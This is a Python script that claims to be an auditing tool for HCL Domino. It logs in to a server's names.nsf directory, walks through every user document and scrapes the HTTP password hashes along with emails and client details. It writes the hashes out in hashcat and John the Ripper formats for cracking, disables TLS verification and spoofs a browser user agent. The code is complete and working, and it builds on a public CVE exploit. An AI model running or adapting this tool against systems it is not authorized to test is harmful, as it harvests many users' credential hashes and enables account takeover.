#!/usr/local/bin/python3

# Title: HCL Domino Password Hash Extraction Tool
# Author: Christian Brandlehner
# Date: 11-01-2024
# Tested on: HCL Domino 14.0
# Credits:
#   Jonathan Broche
#   Alexander Schwankner
#   https://github.com/schwankner/CVE-2005-2428-IBM-Lotus-Domino-R8-Password-Hash-Extraction-Exploit/blob/master/exploit.py
#
# HCL Domino is a very secure platform by default.
# However, configuration mistakes can lead to insecure installations.
# This tool is intended to be used by auditors or Domino-Administrators to check if the configuration is according to best practices.
#
# Read this to understand Domino Internet Passwords:
# https://help.hcltechsw.com/domino/14.0.0/admin/secu_using_more_secure_password_format.html
# https://help.hcltechsw.com/domino/14.0.0/admin/secu_using_xacls_to_secure_internet_passwords.html
#
# Domino also supports protection against brute force attacks and support one-time-passwords:
# https://help.hcltechsw.com/domino/14.0.0/admin/secu_using_internet_password_lockout.html
# https://help.hcltechsw.com/domino/14.0.0/admin/conf_totp_overview.html
#
# With Domino you can use Passkey authentication
# https://help.hcltechsw.com/domino/14.0.0/admin/conf_dominopasskeyauth.html
#
# INSTALLATION
# you may need to install these libaries for a local python3 installation:
# pip3 install requests
# pip3 install beautifulsoup4

import argparse
import csv
import getpass
import re
import sys
from contextlib import ExitStack

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings()

END_OF_VIEW_MARKERS = (
    'Keine Dokumente gefunden',
    'No Document found',
)

parser = argparse.ArgumentParser(description='HCL Domino password hash extraction tool')
VERSION = '3.1'
parser.add_argument('--version', action='version', version=VERSION)
parser.add_argument('system', help="IP address or hostname. ")
parser.add_argument('-n', '--username', metavar='username')
parser.add_argument('-u', '--uri', metavar='path', default="/names.nsf",
                    help="Path to the names.nsf file. [Default: /names.nsf]")
outgroup = parser.add_argument_group(title="Output Options")
outgroup.add_argument('--hashcat', action='store_true', help="Print results for use with hashcat.")
outgroup.add_argument('--john', action='store_true', help="Print results for use with John the Ripper.")
parser.add_argument('-f', '--file', metavar='outputPath', help="Output file in given format. Defaults to <system>.txt")
parser.add_argument('-c', '--csv', metavar='CSV file with many information about the user. Defaults to <system>.csv')

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

if not getattr(args, 'system', None):
    parser.error('The "system" argument is required.')
    sys.exit(1)

if not getattr(args, 'username', None):
    parser.error('The "username" argument is required.')
    sys.exit(1)


def get_input_value(soup, field_name, default=''):
    element = soup.find('input', {'name': field_name})
    if element is None:
        return default
    value = element.get('value')
    return value.strip() if value else default


def detect_algorithm(hash_value):
    if re.match(r"^[a-f0-9]{32}$", hash_value):
        return 'Domino 5'
    if re.match(r"^\([A-Za-z0-9+/]{20}\)$", hash_value):
        return 'Domino 6'
    if re.match(r"^\([A-Za-z0-9+/]{49}\)$", hash_value):
        return 'Domino 8 or later'
    return 'Hash algorithm not detected'


def view_exhausted(response_text):
    return any(marker in response_text for marker in END_OF_VIEW_MARKERS)


print("\nHCL Domino Hash Extraction Tool {}\n".format(VERSION))
print("\n")
print("HCL Domino is a very secure platform by default.")
print("However, configuration mistakes can lead to insecure installations.")
print("This tool is intended to be used by auditors or Domino-Administrators to check if the configuration is according to best practices.")
print("Read this to understand Domino Internet Passwords:")
print("https://help.hcltechsw.com/domino/14.0.0/admin/secu_using_more_secure_password_format.html")
print("https://help.hcltechsw.com/domino/14.0.0/admin/secu_using_xacls_to_secure_internet_passwords.html")
print("Domino also supports protection against brute force attacks and support one-time-passwords:")
print("https://help.hcltechsw.com/domino/14.0.0/admin/secu_using_internet_password_lockout.html")
print("https://help.hcltechsw.com/domino/14.0.0/admin/conf_totp_overview.html")
print("With Domino you can use Passkey authentication")
print("https://help.hcltechsw.com/domino/14.0.0/admin/conf_dominopasskeyauth.html")

password = getpass.getpass(prompt='Password: ', stream=None)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3926.54 Safari/537.36'
}

redirect_to = "{}/People?OpenView".format(args.uri.rstrip('/'))
postData = {'Password': password, 'Username': args.username, 'RedirectTo': redirect_to}

with requests.Session() as s:
    try:
        response = s.post("https://{}{}?Login".format(args.system, args.uri), verify=False, headers=headers,
                          timeout=3, data=postData)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print("Request error:", e)
        sys.exit(1)

    if response.status_code != 200:
        raise SystemExit("Unexpected HTTP status code: {}".format(response.status_code))

    print("Authentication successful. HTTP status code 200 after login. Username and password seem to be correct.")

    filepath = args.file or args.system + ".txt"
    algorithm = "not detected"
    user_count = 0
    start = 1

    with ExitStack() as stack:
        outfile = stack.enter_context(open(filepath, 'w'))
        csvWriter = None
        csvfilepath = None
        if args.csv:
            csvfilepath = args.csv or args.system + ".csv"
            csvfile = stack.enter_context(open(csvfilepath, 'w', newline=''))
            fieldnames = ['name', 'hash', 'algorithm', 'email', 'ClntMachine', 'ClntPltfrm', 'ClntBld',
                          'HTTPPasswordChangeDate']
            csvWriter = csv.DictWriter(csvfile, fieldnames=fieldnames, dialect='excel')
            csvWriter.writeheader()

        while True:
            try:
                response = s.get("https://{}{}/People?OpenView&Start={}".format(args.system, args.uri, start),
                                 verify=False, headers=headers, timeout=3)
                response.raise_for_status()
            except requests.exceptions.Timeout:
                print("[!] Timed out after 3 seconds. Try again if this is a temporary problem.")
                print("URL used: https://{}{}/People?OpenView&Start={}".format(args.system, args.uri, start))
                sys.exit(1)
            except requests.exceptions.RequestException as e:
                print("Request error:", e)
                sys.exit(1)

            if response.status_code != 200:
                raise SystemExit("Unexpected HTTP status code: {}".format(response.status_code))

            print("Success reading users from the Domino Directory (Start={}). HTTP status code is 200".format(start))

            if view_exhausted(response.text):
                for marker in END_OF_VIEW_MARKERS:
                    if marker in response.text:
                        print(marker)
                        break
                break

            soup = BeautifulSoup(response.text, 'html.parser')
            links = []
            for link in soup.find_all('a', href=True):
                href = link['href']
                if "OpenDocument" in href and href not in links:
                    links.append(href)

            if not links:
                print("No user document links found on this page; stopping pagination.")
                break

            print("Success, there seem to be user documents in the view.")

            for link in links:
                try:
                    response = s.get("https://{}{}".format(args.system, link), verify=False, headers=headers, timeout=3)
                    response.raise_for_status()
                except requests.exceptions.Timeout as e:
                    print("Timeout error:", e)
                    continue
                except requests.exceptions.RequestException as e:
                    print("Request error:", e)
                    continue

                if response.status_code != 200:
                    print("Unexpected HTTP status code:", response.status_code)
                    continue

                soup = BeautifulSoup(response.text, 'html.parser')

                name = get_input_value(soup, 'InternetAddress')
                if not name:
                    name = get_input_value(soup, 'DisplayName')

                httppassword = get_input_value(soup, 'dspHTTPPassword')
                dsphttppassword = get_input_value(soup, 'PasswordDigest')

                email = get_input_value(soup, 'InternetAddress')
                ClntMachine = get_input_value(soup, 'ClntMachine')
                ClntBld = get_input_value(soup, 'ClntBld')
                ClntPltfrm = get_input_value(soup, 'ClntPltfrm')
                HTTPPasswordChangeDate = get_input_value(soup, 'HTTPPasswordChangeDate')

                hash_value = httppassword or dsphttppassword
                user_count += 1

                if not hash_value:
                    print('No password hash found for user:', name)
                    continue

                algorithm = detect_algorithm(hash_value)
                print("Algorithm:", algorithm)
                if csvWriter:
                    csvWriter.writerow({
                        'name': name,
                        'hash': hash_value,
                        'algorithm': algorithm,
                        'email': email,
                        'ClntMachine': ClntMachine,
                        'ClntPltfrm': ClntPltfrm,
                        'ClntBld': ClntBld,
                        'HTTPPasswordChangeDate': HTTPPasswordChangeDate,
                    })

                print((str(user_count) + " " + name + " : " + hash_value))
                if args.hashcat or args.john:
                    if args.hashcat:
                        outfile.write(hash_value + "\n")
                    if args.john:
                        outfile.write("{}:{}\n".format(name, hash_value))
                else:
                    outfile.write("[*] User: {} Hash: {}\n".format(name, hash_value))

            start += 30

        print()
        if csvfilepath:
            print("extended account information written to " + csvfilepath)
        print("hashes written to " + filepath + " with hashing algorithm: " + algorithm)